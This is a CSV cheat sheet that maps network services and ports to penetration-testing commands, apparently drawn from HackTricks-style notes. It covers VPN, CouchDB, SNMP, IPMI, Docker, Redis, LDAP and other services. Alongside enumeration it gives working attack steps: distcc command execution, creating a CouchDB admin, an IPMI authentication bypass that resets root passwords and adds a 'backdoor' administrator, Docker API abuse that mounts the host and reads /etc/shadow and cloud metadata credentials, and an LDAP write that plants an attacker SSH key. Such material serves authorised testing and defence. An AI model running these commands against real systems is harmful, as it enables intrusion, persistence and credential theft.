Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
VPN,500,None,NoNameAdded,No Description,"fiked -g {IP} -k testgroup:secretkey -l output.txt -d
",Unverified,1
VPN,500,None,NoNameAdded,No Description,"# ./ikeforce.py {IP} -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
",Unverified,1
distcc,3632,None,NoNameAdded,No Description,"msf5 > use exploit/unix/misc/distcc_exec
nmap -p 3632 <ip> --script distcc-exec --script-args=""distcc-exec.cmd='id'""
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> {IP}
msf> use auxiliary/scanner/couchdb/couchdb_enum
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"# {""couchdb"":""Welcome"",""version"":""0.10.1""}
{""couchdb"":""Welcome"",""version"":""2.0.0"",""vendor"":{""name"":""The Apache Software Foundation""}}
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"# [""_global_changes"",""_metadata"",""_replicator"",""_users"",""passwords"",""simpsons""]
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"curl http://{IP}:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{""db_name"":""simpsons"",""update_seq"":""7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ"",""sizes"":{""file"":62767,""external"":1320,""active"":2466},""purge_seq"":0,""other"":{""data_size"":1320},""doc_del_count"":0,""doc_count"":7,""disk_size"":62767,""disk_format_version"":6,""data_size"":2466,""compact_running"":false,""instance_start_time"":""0""}
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"curl -X GET http://{IP}:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{""total_rows"":7,""offset"":0,""rows"":[
{""id"":""f0042ac3dc4951b51f056467a1000dd9"",""key"":""f0042ac3dc4951b51f056467a1000dd9"",""value"":{""rev"":""1-fbdd816a5b0db0f30cf1fc38e1a37329""}},
{""id"":""f53679a526a868d44172c83a61000d86"",""key"":""f53679a526a868d44172c83a61000d86"",""value"":{""rev"":""1-7b8ec9e1c3e29b2a826e3d14ea122f6e""}},
{""id"":""f53679a526a868d44172c83a6100183d"",""key"":""f53679a526a868d44172c83a6100183d"",""value"":{""rev"":""1-e522ebc6aca87013a89dd4b37b762bd3""}},
{""id"":""f53679a526a868d44172c83a61002980"",""key"":""f53679a526a868d44172c83a61002980"",""value"":{""rev"":""1-3bec18e3b8b2c41797ea9d61a01c7cdc""}},
{""id"":""f53679a526a868d44172c83a61003068"",""key"":""f53679a526a868d44172c83a61003068"",""value"":{""rev"":""1-3d2f7da6bd52442e4598f25cc2e84540""}},
{""id"":""f53679a526a868d44172c83a61003a2a"",""key"":""f53679a526a868d44172c83a61003a2a"",""value"":{""rev"":""1-4446bfc0826ed3d81c9115e450844fb4""}},
{""id"":""f53679a526a868d44172c83a6100451b"",""key"":""f53679a526a868d44172c83a6100451b"",""value"":{""rev"":""1-3f6141f3aba11da1d65ff0c13fe6fd39""}}
]}
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"curl -X GET http://{IP}:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{""_id"":""f0042ac3dc4951b51f056467a1000dd9"",""_rev"":""1-fbdd816a5b0db0f30cf1fc38e1a37329"",""character"":""Homer"",""quote"":""Doh!""}
",Unverified,1
CouchDB,5984,None,NoNameAdded,No Description,"curl -X PUT -d '{""type"":""user"",""name"":""hacktricks"",""roles"":[""_admin""],""roles"":[],""password"":""hacktricks""}' localhost:5984/_users/org.couchdb.user:hacktricks -H ""Content-Type:application/json""
",Unverified,1
SNMP,161,None,NoNameAdded,No Description,"snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_{IP}]
snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_{IP}] 1.3.6.1.2.1.4.34.1.3 #Get {IP}v6, needed dec2hex
snmp-check [DIR_{IP}] -p [PORT] -c [COMM_STRING]
nmap --script ""snmp* and not snmp-brute"" <target>
",Unverified,1
SNMP,161,None,NoNameAdded,No Description,"# apt-get install snmp-mibs-downloader
download-mibs
",Unverified,1
SNMP,161,None,NoNameAdded,No Description,"# grep -i ""trap"" *.snmp
",Unverified,1
SNMP,161,None,NoNameAdded,No Description,"# grep -i ""login\|fail"" *.snmp
",Unverified,1
SNMP,161,None,NoNameAdded,No Description,"# grep -E -o ""\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"" *.snmp
",Unverified,1
RTSP,554,None,NoNameAdded,No Description,"nmap -sV --scripts ""rtsp-*"" -p <PORT> {IP}
",Unverified,1
POP,110,None,NoNameAdded,No Description,"# nc -nv {IP} 110
openssl s_client -connect {IP}:995 -crlf -quiet
",Unverified,1
POP,110,None,NoNameAdded,No Description,"nmap --scripts ""pop3-capabilities or pop3-ntlm-info"" -sV -port <PORT> {IP} #All are default scripts
",Unverified,1
POP,110,None,NoNameAdded,No Description,"POP commands:
  USER uid           Log in as ""uid""
  PASS password      Substitue ""password"" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities
",Unverified,1
VNC,5800,None,NoNameAdded,No Description,"nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> {IP}
msf> use auxiliary/scanner/vnc/vnc_none_auth
",Unverified,1
VNC,5800,None,NoNameAdded,No Description,"# vncviewer [-passwd passwd.txt] {IP}::5901
",Unverified,1
VNC,5800,None,NoNameAdded,No Description,"make
vncpwd <vnc password file>
",Unverified,1
FireWall-1,264,None,NoNameAdded,No Description,"printf '\x51\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x0bsecuremote\x00' | nc -q 1 x.x.x.x 264 | grep -a CN | cut -c 2-
",Unverified,1
AMQP,5671,None,NoNameAdded,No Description,"nmap -sV -Pn -n -T4 -p 5672 --script amqp-info {IP}

PORT     STATE SERVICE VERSION
5672/tcp open  amqp    RabbitMQ 3.1.5 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|   copyright: Copyright (C) 2007-2013 GoPivotal, Inc.
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
|   platform: Erlang/OTP
|   product: RabbitMQ
|   version: 3.1.5
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"# use auxiliary/scanner/ipmi/ipmi_version
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"# apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
1                    false  false      true      ADMINISTRATOR
2  root            false  false      true      ADMINISTRATOR
3  admin            true    true      true      ADMINISTRATOR

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to ""newpassword""
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"#  cat /nv/PSBlock
  admin                      ADMINpassword^TT                    rootOtherPassword!
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"# msf> use exploit/multi/upnp/libupnp_ssdp_overflow
",Unverified,1
IPMI,623,None,NoNameAdded,No Description,"ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
",Unverified,1
Elasticsearch,9200,None,NoNameAdded,No Description,"curl -X GET ""ELASTICSEARCH-SERVER:9200/_xpack/security/user""
{""error"":{""root_cause"":[{""type"":""exception"",""reason"":""Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.""}],""type"":""exception"",""reason"":""Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node.""},""status"":500}
",Unverified,1
Elasticsearch,9200,None,NoNameAdded,No Description,"# {""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""missing authentication credentials for REST request [/]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}}],""type"":""security_exception"",""reason"":""missing authentication credentials for REST request [/]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}},""status"":401}
",Unverified,1
Elasticsearch,9200,None,NoNameAdded,No Description,"#List all roles on the system:
curl -X GET ""ELASTICSEARCH-SERVER:9200/_security/role""

#List all users on the system:
curl -X GET ""ELASTICSEARCH-SERVER:9200/_security/user""

#Get more information about the rights of an user:
curl -X GET ""ELASTICSEARCH-SERVER:9200/_security/user/<USERNAME>""
",Unverified,1
Elasticsearch,9200,None,NoNameAdded,No Description,"curl -X POST '10.10.10.115:9200/bookindex/books' -H 'Content-Type: application/json' -d'
 {
    ""bookId"" : ""A00-3"",
    ""author"" : ""Sankaran"",
    ""publisher"" : ""Mcgrahill"",
    ""name"" : ""how to get a job""
 }'
",Unverified,1
Elasticsearch,9200,None,NoNameAdded,No Description,"msf > use auxiliary/scanner/elasticsearch/indices_enum
",Unverified,1
TFTP/Bittorrent-tracker,69,None,NoNameAdded,No Description,"nmap -n -Pn -sU -p69 -sV --script tftp-enum {IP}
",Unverified,1
TFTP/Bittorrent-tracker,69,None,NoNameAdded,No Description,"# msf5> auxiliary/admin/tftp/tftp_transfer_util
",Unverified,1
TFTP/Bittorrent-tracker,69,None,NoNameAdded,No Description,"# import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download(""filename in server"", ""/tmp/filename"", timeout=5)
client.upload(""filename to upload"", ""/local/path/file"", timeout=5)
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine 
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"podman --version
podman info
pdoman images ls
podman ls
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{""Platform"":{""Name"":""Docker Engine - Community""},""Components"":[{""Name"":""Engine"",""Version"":""19.03.1"",""Details"":{""ApiVersion"":""1.40"",""Arch"":""amd64"",""BuildTime"":""2019-07-25T21:19:41.000000000+00:00"",""Experimental"":""false"",""GitCommit"":""74b1e89"",""GoVersion"":""go1.12.5"",""KernelVersion"":""5.0.0-20-generic"",""MinAPIVersion"":""1.12"",""Os"":""linux""}},{""Name"":""containerd"",""Version"":""1.2.6"",""Details"":{""GitCommit"":""894b81a4b802e4eb2a91d1ce216b8817763c29fb""}},{""Name"":""runc"",""Version"":""1.0.0-rc8"",""Details"":{""GitCommit"":""425e105d5a03fabd737a126ad93d62a9eeede87f""}},{""Name"":""docker-init"",""Version"":""0.18.0"",""Details"":{""GitCommit"":""fec3683""}}],""Version"":""19.03.1"",""ApiVersion"":""1.40"",""MinAPIVersion"":""1.12"",""GitCommit"":""74b1e89"",""GoVersion"":""go1.12.5"",""Os"":""linux"",""Arch"":""amd64"",""KernelVersion"":""5.0.0-20-generic"",""BuildTime"":""2019-07-25T21:19:41.000000000+00:00""}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
 Version:           19.03.1
 API version:       1.40
 Go version:        go1.12.5
 Git commit:        74b1e89
 Built:             Thu Jul 25 21:21:05 2019
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.1
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.5
  Git commit:       74b1e89
  Built:            Thu Jul 25 21:19:41 2019
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.2.6
  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
 runc:
  Version:          1.0.0-rc8
  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance""]}'
#Get the output
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""mount""]}'
#Get the output by starting the exec
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""cat /run/secrets/registry-key.key""]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket2376/containers/create?name=test -d '{""Image"":""alpine"", ""Cmd"":[""/usr/bin/tail"", ""-f"", ""1234"", ""/dev/null""], ""Binds"": [ ""/:/mnt"" ], ""Privileged"": true}'
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""cat /mnt/etc/shadow""]}'
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/prune
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"# msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script ""docker-*"" -p <PORT> <IP>
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"nmap --script redis-info -sV -p 6379 {IP}
msf> use auxiliary/scanner/redis/redis_server
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"# nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"AUTH <username> <password>
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"# SELECT 1
[ ... Indicate the database ... ]
KEYS * 
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts: 
dc=DOMAIN,dc=DOMAIN
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"nmap -n -sV --script ""ldap* and not brute"" {IP} #Using anonymous credentials
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# pip3 install ldapdomaindump 
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '' -w '' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"## CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
-x Simple Authentication
-h LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
#Example: ldapsearch -x -h {IP} -D 'MYDOM\john' -w 'johnpassw' -b ""CN=Users,DC=mydom,DC=local""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
